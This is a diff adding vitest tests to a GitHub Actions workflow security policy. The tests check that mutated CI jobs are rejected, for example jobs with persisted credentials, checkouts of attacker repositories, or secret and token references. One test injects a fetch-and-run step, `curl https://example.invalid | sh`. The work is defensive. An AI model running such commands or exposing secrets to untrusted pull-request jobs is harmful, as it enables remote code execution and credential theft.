@@ -3,9 +3,12 @@ import { describe, expect, test } from 'vitest';
 import {
   classifyActionlintEvaluation,
   compareToBaseline,
+  expressionReadsCredential,
   FAST_CHECKS_JOB_TIMEOUT_MINUTES,
   findingKey,
+  PNPM_JS_SETUP_STEP,
   PNPM_SETUP_ACTION,
+  PNPM_SETUP_NATIVE_GUARD,
   parseFindings,
   persistentRunnerPolicyFindings,
   REVIEWED_CACHE_RESTORE_ACTION,
@@ -282,6 +285,84 @@ describe('persistent runner policy', () => {
     mutate(document.jobs[jobId]);
     return [{ file: workflow.file, document }];
   }
+
+  function portableArchiveWorkflowFixture(
+    mutate: (step: Record<string, unknown>) => void = () => {},
+  ) {
+    const workflow = readWorkflowDocuments().find(
+      ({ file }) => file === '.github/workflows/portable-server-archives.yml',
+    );
+    if (!workflow) throw new Error('Expected the portable archive workflow.');
+    const document = structuredClone(workflow.document) as {
+      jobs: Record<string, { steps: Array<Record<string, unknown>> }>;
+    };
+    const upload = document.jobs.archive.steps.find(
+      (step) => step.name === 'Upload the archive and its descriptor',
+    );
+    if (!upload) throw new Error('Expected the archive upload step.');
+    mutate(upload);
+    return [{ file: workflow.file, document }];
+  }
+
+  const UNREVIEWED_ACTION = {
+    file: '.github/workflows/portable-server-archives.yml',
+    jobId: 'archive',
+    message:
+      'base-controlled PR workflows must not add unreviewed custom actions or reusable execution',
+  };
+
+  test('admits the exact portable archive upload', () => {
+    expect(
+      persistentRunnerPolicyFindings(portableArchiveWorkflowFixture()),
+    ).toEqual([]);
+  });
+
+  test.each([
+    [
+      'a workspace path with hidden files',
+      (step: Record<string, unknown>) => {
+        step.with = {
+          ...(step.with as object),
+          path: `\${{ github.workspace }}`,
+          'include-hidden-files': true,
+        };
+      },
+    ],
+    [
+      'an added upload input',
+      (step: Record<string, unknown>) => {
+        step.with = { ...(step.with as object), overwrite: true };
+      },
+    ],
+    [
+      'a longer retention',
+      (step: Record<string, unknown>) => {
+        step.with = { ...(step.with as object), 'retention-days': 90 };
+      },
+    ],
+    [
+      'no fork guard',
+      (step: Record<string, unknown>) => {
+        delete step.if;
+      },
+    ],
+    [
+      'a guard that admits fork pull requests',
+      (step: Record<string, unknown>) => {
+        step.if = 'always()';
+      },
+    ],
+    [
+      'an unpinned upload action',
+      (step: Record<string, unknown>) => {
+        step.uses = 'actions/upload-artifact@v7';
+      },
+    ],
+  ])('refuses a portable archive upload with %s', (_label, mutate) => {
+    expect(
+      persistentRunnerPolicyFindings(portableArchiveWorkflowFixture(mutate)),
+    ).toContainEqual(UNREVIEWED_ACTION);
+  });
 
   test('rejects an unguarded self-hosted PR fast-checks job', () => {
     const workflow = readWorkflowDocuments().find(
@@ -654,6 +735,170 @@ describe('persistent runner policy', () => {
     });
   });
 
+  function repoScansCheckout(job: Record<string, unknown>) {
+    const checkout = (job.steps as Array<Record<string, unknown>>).find(
+      (step) => String(step.uses).startsWith('actions/checkout@'),
+    ) as { uses: string; with: Record<string, unknown> };
+    if (!checkout) throw new Error('Expected the repo-scans checkout.');
+    return checkout;
+  }
+
+  test('accepts the checked-in repo-scans job and nothing else in it (#2176)', () => {
+    const clean = primaryCiJobFixture('repo-scans', () => {});
+    expect(
+      persistentRunnerPolicyFindings(clean).filter(
+        (finding) => finding.jobId === 'repo-scans',
+      ),
+    ).toEqual([]);
+  });
+
+  test.each([
+    [
+      'a fork-reachable guard',
+      (job: Record<string, unknown>) => {
+        job.if = `\${{ github.event_name == 'pull_request_target' }}`;
+      },
+      'repo-scans must use the exact same-repository pull_request_target guard',
+    ],
+    [
+      'a write permission',
+      (job: Record<string, unknown>) => {
+        job.permissions = { contents: 'write' };
+      },
+      'repo-scans must declare only permissions: { contents: read }',
+    ],
+    [
+      'a checkout that keeps credentials',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        checkout.with['persist-credentials'] = true;
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a checkout of another repository',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        checkout.with.repository = 'someone/else';
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a checkout of the base ref',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        checkout.with.ref = `\${{ github.event.pull_request.base.sha }}`;
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a checkout that drops the ref',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        delete checkout.with.ref;
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a checkout that drops the repository',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        delete checkout.with.repository;
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a checkout with a token',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        checkout.with.token = `\${{ secrets.GITHUB_TOKEN }}`;
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'an unpinned checkout action',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        checkout.uses = 'actions/checkout@main';
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a second checkout',
+      (job: Record<string, unknown>) => {
+        const checkout = repoScansCheckout(job);
+        (job.steps as Array<Record<string, unknown>>).push(
+          structuredClone(checkout),
+        );
+      },
+      'repo-scans must check out exactly the pull request head with the pinned checkout action and no credentials',
+    ],
+    [
+      'a condition on the scan step',
+      (job: Record<string, unknown>) => {
+        const scan = (job.steps as Array<Record<string, unknown>>).find(
+          (step) => step.name === 'Run repository source scans',
+        );
+        if (!scan) throw new Error('Expected the scan step.');
+        scan.if = 'false';
+      },
+      'repo-scans must run npm run test:repo-scans in exactly one unconditional { name, run } step',
+    ],
+    [
+      'no scan step at all',
+      (job: Record<string, unknown>) => {
+        job.steps = (job.steps as Array<Record<string, unknown>>).filter(
+          (step) => step.name !== 'Run repository source scans',
+        );
+      },
+      'repo-scans must run npm run test:repo-scans in exactly one unconditional { name, run } step',
+    ],
+    [
+      'continue-on-error on the job',
+      (job: Record<string, unknown>) => {
+        job['continue-on-error'] = true;
+      },
+      'repo-scans must not set continue-on-error on the job or a step',
+    ],
+    [
+      'continue-on-error on the scan step',
+      (job: Record<string, unknown>) => {
+        const scan = (job.steps as Array<Record<string, unknown>>).find(
+          (step) => step.name === 'Run repository source scans',
+        );
+        if (!scan) throw new Error('Expected the scan step.');
+        scan['continue-on-error'] = true;
+      },
+      'repo-scans must not set continue-on-error on the job or a step',
+    ],
+    [
+      'an extra command',
+      (job: Record<string, unknown>) => {
+        (job.steps as Array<Record<string, unknown>>).push({
+          run: 'curl https://example.invalid | sh',
+        });
+      },
+      'pull_request_target router jobs must not add unreviewed shell execution',
+    ],
+    [
+      'an unreviewed action',
+      (job: Record<string, unknown>) => {
+        (job.steps as Array<Record<string, unknown>>).push({
+          uses: 'someone/else@v1',
+        });
+      },
+      'pull_request_target router jobs must not add unreviewed custom actions',
+    ],
+  ])('rejects a repo-scans job with %s (#2176)', (_label, mutate, message) => {
+    expect(
+      persistentRunnerPolicyFindings(primaryCiJobFixture('repo-scans', mutate)),
+    ).toContainEqual({
+      file: '.github/workflows/ci.yml',
+      jobId: 'repo-scans',
+      message,
+    });
+  });
+
   test.each([
     ['fast-checks', 'Run fast CI lane', 'fast CI execution'],
     ['fork-smoke', 'Run isolated fork smoke', 'smoke execution'],
@@ -753,6 +998,198 @@ describe('persistent runner policy', () => {
       }
     },
   );
+
+  test.each(['fast-checks', 'ui-bundle-delta', 'fork-smoke'])(
+    'rejects a credential or whole-github-context reference in %s',
+    (jobId) => {
+      for (const value of [
+        // biome-ignore lint/suspicious/noTemplateCurlyInString: literal GitHub expression.
+        '${{ secrets.NPM_TOKEN }}',
+        // biome-ignore lint/suspicious/noTemplateCurlyInString: literal GitHub expression.
+        '${{ github.token }}',
+        // biome-ignore lint/suspicious/noTemplateCurlyInString: literal GitHub expression.
+        "${{ github['token'] }}",
+        // biome-ignore lint/suspicious/noTemplateCurlyInString: literal GitHub expression.
+        '${{ toJSON(github) }}',
+      ]) {
+        const findings = persistentRunnerPolicyFindings(
+          primaryCiJobFixture(jobId, (job) => {
+            const step = (job.steps as Array<Record<string, unknown>>).find(
+              (candidate) => typeof candidate.run === 'string',
+            );
+            if (!step) throw new Error(`Expected a run step in ${jobId}.`);
+            step.env = { ...(step.env as object), LEAK: value };
+          }),
+        );
+        expect(findings, value).toContainEqual({
+          file: '.github/workflows/ci.yml',
+          jobId,
+          message:
+            'ci.yml jobs must not reference secrets, the GitHub token, or the whole github context',
+        });
+      }
+    },
+  );
+
+  test('classifies credential expressions without flagging ordinary github reads', () => {
+    for (const expression of [
+      ' secrets.NPM_TOKEN ',
+      ' github.token ',
+      " github [ 'token' ] ",
+      ' github["token"] ',
+      ' toJSON(github) ',
+      " format('{0}', github) ",
+    ])
+      expect(expressionReadsCredential(expression), expression).toBe(true);
+    for (const expression of [
+      ' github.event.pull_request.head.sha ',
+      " github.event_name == 'merge_group' ",
+      ' github.repository ',
+      " github['event_name'] ",
+      " 'kontourai/.github' ",
+      ' toJSON(github.event.pull_request.labels) ',
+    ])
+      expect(expressionReadsCredential(expression), expression).toBe(false);
+  });
+
+  test('the shipped ci.yml jobs reference no credential', () => {
+    const findings = persistentRunnerPolicyFindings(
+      primaryCiJobFixture('fast-checks', () => {}),
+    );
+    expect(
+      findings.filter(({ message }) =>
+        message.includes('must not reference secrets, the GitHub token'),
+      ),
+    ).toEqual([]);
+  });
+
+  describe('ui-bundle-delta report job (#1703)', () => {
+    type Step = Record<string, unknown> & {
+      name?: string;
+      env?: Record<string, string>;
+      with?: Record<string, unknown>;
+    };
+    const steps = (job: Record<string, unknown>) => job.steps as Step[];
+    const report = (job: Record<string, unknown>) =>
+      steps(job).find((step) => step.name === 'Report UI entry bundle delta');
+
+    test('accepts the checked-in job', () => {
+      expect(
+        persistentRunnerPolicyFindings(
+          primaryCiJobFixture('ui-bundle-delta', () => {}),
+        ).filter(({ jobId }) => jobId === 'ui-bundle-delta'),
+      ).toEqual([]);
+    });
+
+    test.each([
+      [
+        'a merge_group trigger',
+        (job: Record<string, unknown>) => {
+          job.if = `\${{ github.event_name == 'merge_group' || (github.event_name == 'pull_request_target' && github.event.pull_request.head.repo.full_name == github.repository) }}`;
+        },
+        'ui-bundle-delta must use the exact same-repository pull_request_target guard (no merge_group)',
+      ],
+      [
+        'job-level continue-on-error',
+        (job: Record<string, unknown>) => {
+          job['continue-on-error'] = true;
+        },
+        'ui-bundle-delta is report-only by exiting zero, never by continue-on-error',
+      ],
+      [
+        'step-level continue-on-error',
+        (job: Record<string, unknown>) => {
+          const step = report(job);
+          if (step) step['continue-on-error'] = true;
+        },
+        'ui-bundle-delta is report-only by exiting zero, never by continue-on-error',
+      ],
+      [
+        'a different base',
+        (job: Record<string, unknown>) => {
+          const step = report(job);
+          if (step?.env) step.env.STATION_UI_BUNDLE_DELTA_BASE = 'origin/main';
+        },
+        'ui-bundle-delta must measure against the pull-request base sha',
+      ],
+      [
+        'a concurrency group without the head sha',
+        (job: Record<string, unknown>) => {
+          job.concurrency = {
+            // biome-ignore lint/suspicious/noTemplateCurlyInString: literal GitHub expression.
+            group: 'ui-bundle-delta-${{ github.event.pull_request.number }}',
+            'cancel-in-progress': true,
+          };
+        },
+        'ui-bundle-delta concurrency must key on the pull-request head sha',
+      ],
+      [
+        'persisted checkout credentials',
+        (job: Record<string, unknown>) => {
+          const checkout = steps(job).find((step) =>
+            String(step.uses).startsWith('actions/checkout@'),
+          );
+          if (checkout?.with) checkout.with['persist-credentials'] = true;
+        },
+        'ui-bundle-delta must check out once, with full history and persist-credentials: false',
+      ],
+      [
+        'a checkout of another repository',
+        (job: Record<string, unknown>) => {
+          const checkout = steps(job).find((step) =>
+            String(step.uses).startsWith('actions/checkout@'),
+          );
+          if (checkout?.with) checkout.with.repository = 'evil/repo';
+        },
+        'ui-bundle-delta must check out exactly the pull-request head repository and sha',
+      ],
+      [
+        'a checkout of another ref',
+        (job: Record<string, unknown>) => {
+          const checkout = steps(job).find((step) =>
+            String(step.uses).startsWith('actions/checkout@'),
+          );
+          if (checkout?.with) checkout.with.ref = 'refs/heads/attacker';
+        },
+        'ui-bundle-delta must check out exactly the pull-request head repository and sha',
+      ],
+      [
+        'a secrets reference',
+        (job: Record<string, unknown>) => {
+          const step = report(job);
+          // biome-ignore lint/suspicious/noTemplateCurlyInString: literal GitHub expression.
+          if (step?.env) step.env.TOKEN = '${{ secrets.NPM_TOKEN }}';
+        },
+        'ci.yml jobs must not reference secrets, the GitHub token, or the whole github context',
+      ],
+      [
+        'a GitHub token reference',
+        (job: Record<string, unknown>) => {
+          const step = report(job);
+          // biome-ignore lint/suspicious/noTemplateCurlyInString: literal GitHub expression.
+          if (step?.env) step.env.GH_TOKEN = '${{ github.token }}';
+        },
+        'ci.yml jobs must not reference secrets, the GitHub token, or the whole github context',
+      ],
+      [
+        'an extra shell command',
+        (job: Record<string, unknown>) => {
+          steps(job).push({ name: 'Extra', run: 'npm run build:ui' });
+        },
+        'pull_request_target router jobs must not add unreviewed shell execution',
+      ],
+    ])('rejects %s', (_name, mutate, message) => {
+      expect(
+        persistentRunnerPolicyFindings(
+          primaryCiJobFixture('ui-bundle-delta', mutate),
+        ),
+      ).toContainEqual({
+        file: '.github/workflows/ci.yml',
+        jobId: 'ui-bundle-delta',
+        message,
+      });
+    });
+  });
 
   test('rejects an OR tautology in a persistent pull_request_target skip guard', () => {
     const workflow = readWorkflowDocuments().find(
@@ -960,6 +1397,7 @@ describe('persistent runner policy', () => {
       '.github/workflows/ecosystem-packaging.yml',
       '.github/workflows/install-smoke.yml',
       '.github/workflows/merge-queue-regression.yml',
+      '.github/workflows/portable-server-archives.yml',
       '.github/workflows/security-analysis.yml',
     ];
     for (const file of expected) {
@@ -2833,9 +3271,10 @@ describe('the real workflow corpus', () => {
     // `main` went red on this line, not on the change that tripped it. A bare
     // count names whoever gates next rather than whoever moved it; the
     // contributing files are listed below so the next removal says which one.
-    expect(directCapacityJobs).toBe(7);
+    // 7 until #2416 moved CI Extended's coverage onto parallel hosted shards,
+    // which dropped `ci-extended.yml#coverage` from the fleet.
+    expect(directCapacityJobs).toBe(6);
     expect(capacityFiles.sort()).toEqual([
-      '.github/workflows/ci-extended.yml#coverage',
       '.github/workflows/ci-extended.yml#playwright-full',
       '.github/workflows/container-smoke.yml#smoke',
       '.github/workflows/interactive-workspace-performance.yml#one-hour-collaboration-reference',
@@ -3771,4 +4210,187 @@ describe('untrusted-workflow cache policy follows callees and allowlists actions
       },
     );
   });
+});
+
+describe('Intel macOS pnpm provisioning (#2675)', () => {
+  type Step = Record<string, unknown>;
+  type Job = {
+    'runs-on'?: unknown;
+    strategy?: { matrix?: { include?: Array<Record<string, unknown>> } };
+    steps: Step[];
+  };
+  const PORTABLE = '.github/workflows/portable-server-archives.yml';
+  const RELEASE = '.github/workflows/release.yml';
+  const INTEL_JOBS = [
+    [PORTABLE, 'archive'],
+    [RELEASE, 'desktop-macos'],
+  ] as const;
+  // Pinned literals, independent of the constants under test.
+  const NATIVE_GUARD = "runner.os != 'macOS' || runner.arch != 'X64'";
+  const JS_GUARD = "runner.os == 'macOS' && runner.arch == 'X64'";
+  const INTEL_MESSAGE = expect.stringContaining(
+    'a job that can run on Intel macOS must guard pnpm/setup',
+  );
+
+  function corpusWith(
+    file: string,
+    jobId: string,
+    mutate?: (job: Job) => void,
+  ) {
+    const workflows = readWorkflowDocuments().map((workflow) => ({
+      ...workflow,
+      document: structuredClone(workflow.document),
+    }));
+    const target = workflows.find((workflow) => workflow.file === file);
+    if (!target) throw new Error(`Expected ${file}.`);
+    const job = (target.document as { jobs: Record<string, Job> }).jobs[jobId];
+    if (!job) throw new Error(`Expected ${file} job ${jobId}.`);
+    mutate?.(job);
+    return { workflows, job };
+  }
+  const nativeSetup = (job: Job) => {
+    const step = job.steps.find((candidate) =>
+      String(candidate.uses).startsWith('pnpm/setup@'),
+    );
+    if (!step) throw new Error('Expected pnpm/setup.');
+    return step;
+  };
+  const withoutJsStep = (job: Job) => {
+    job.steps = job.steps.filter(
+      (step) => step.name !== PNPM_JS_SETUP_STEP.name,
+    );
+  };
+  const findingsFor = (
+    workflows: ReturnType<typeof corpusWith>['workflows'],
+    file: string,
+    jobId: string,
+  ) =>
+    persistentRunnerPolicyFindings(workflows).filter(
+      (finding) => finding.file === file && finding.jobId === jobId,
+    );
+
+  test.each(INTEL_JOBS)(
+    'the checked-in %s %s job is clean and provisions JS pnpm only on Intel',
+    (file, jobId) => {
+      const { workflows, job } = corpusWith(file, jobId);
+      expect(findingsFor(workflows, file, jobId)).toEqual([]);
+      // Non-vacuity: this job really has an Intel leg and an Apple one.
+      const runners = (job.strategy?.matrix?.include ?? []).map(
+        (entry) => entry.runner,
+      );
+      expect(runners).toContain('macos-15-intel');
+      expect(runners).toContain('macos-15');
+      expect(nativeSetup(job).if).toBe(NATIVE_GUARD);
+      const js = job.steps.find(
+        (step) => step.name === PNPM_JS_SETUP_STEP.name,
+      );
+      expect(js).toEqual({ ...PNPM_JS_SETUP_STEP });
+      expect(js?.if).toBe(JS_GUARD);
+      expect(PNPM_SETUP_NATIVE_GUARD).toBe(NATIVE_GUARD);
+      // pnpm must be on PATH before setup-node (release caches with pnpm).
+      const setupNode = job.steps.findIndex((step) =>
+        String(step.uses).startsWith('actions/setup-node@'),
+      );
+      expect(job.steps.indexOf(js as Step)).toBeLessThan(setupNode);
+    },
+  );
+
+  test.each(INTEL_JOBS)(
+    'refuses %s %s reverted to unguarded pnpm/setup',
+    (file, jobId) => {
+      const { workflows } = corpusWith(file, jobId, (job) => {
+        delete nativeSetup(job).if;
+        withoutJsStep(job);
+      });
+      expect(
+        findingsFor(workflows, file, jobId).map(({ message }) => message),
+      ).toContainEqual(INTEL_MESSAGE);
+    },
+  );
+
+  test.each(INTEL_JOBS)(
+    'refuses %s %s with the guard but no JS pnpm step',
+    (file, jobId) => {
+      const { workflows } = corpusWith(file, jobId, withoutJsStep);
+      expect(
+        findingsFor(workflows, file, jobId).map(({ message }) => message),
+      ).toContainEqual(INTEL_MESSAGE);
+    },
+  );
+
+  test.each(INTEL_JOBS)(
+    'refuses a drifted JS pnpm step in %s %s',
+    (file, jobId) => {
+      const { workflows } = corpusWith(file, jobId, (job) => {
+        const js = job.steps.find(
+          (step) => step.name === PNPM_JS_SETUP_STEP.name,
+        );
+        if (!js) throw new Error('Expected the JS pnpm step.');
+        js.run = String(js.run).replace(
+          'npm pack "$manager"',
+          'npm pack pnpm@latest',
+        );
+      });
+      const messages = findingsFor(workflows, file, jobId).map(
+        ({ message }) => message,
+      );
+      expect(messages).toContain(
+        `'${PNPM_JS_SETUP_STEP.name}' must match PNPM_JS_SETUP_STEP exactly`,
+      );
+      expect(messages).toContainEqual(INTEL_MESSAGE);
+    },
+  );
+
+  test('refuses any other condition on pnpm/setup', () => {
+    const { workflows } = corpusWith(PORTABLE, 'archive', (job) => {
+      nativeSetup(job).if = 'always()';
+    });
+    const messages = findingsFor(workflows, PORTABLE, 'archive').map(
+      ({ message }) => message,
+    );
+    expect(messages).toContainEqual(INTEL_MESSAGE);
+    // The base-controlled PR policy stops admitting the bootstrap, too.
+    expect(messages).toContain(
+      'base-controlled PR workflows must not add unreviewed custom actions or reusable execution',
+    );
+  });
+
+  function oneJob(runsOn: unknown, steps: Step[]) {
+    return [
+      {
+        file: '.github/workflows/synthetic.yml',
+        document: {
+          on: { push: {} },
+          jobs: { build: { 'runs-on': runsOn, steps } },
+        },
+      },
+    ];
+  }
+  const unguarded = {
+    name: 'Setup pinned pnpm',
+    uses: PNPM_SETUP_ACTION,
+    with: { install: false },
+  };
+
+  test.each(['macos-15-intel', 'macos-13', 'macos-15-large'])(
+    'refuses unguarded pnpm/setup on %s',
+    (label) => {
+      expect(
+        persistentRunnerPolicyFindings(oneJob(label, [unguarded])).map(
+          ({ message }) => message,
+        ),
+      ).toContainEqual(INTEL_MESSAGE);
+    },
+  );
+
+  test.each(['macos-15', 'macos-15-xlarge', 'ubuntu-latest', 'windows-latest'])(
+    'leaves unguarded pnpm/setup alone on %s (false-positive control)',
+    (label) => {
+      expect(
+        persistentRunnerPolicyFindings(oneJob(label, [unguarded])).map(
+          ({ message }) => message,
+        ),
+      ).not.toContainEqual(INTEL_MESSAGE);
+    },
+  );
 });
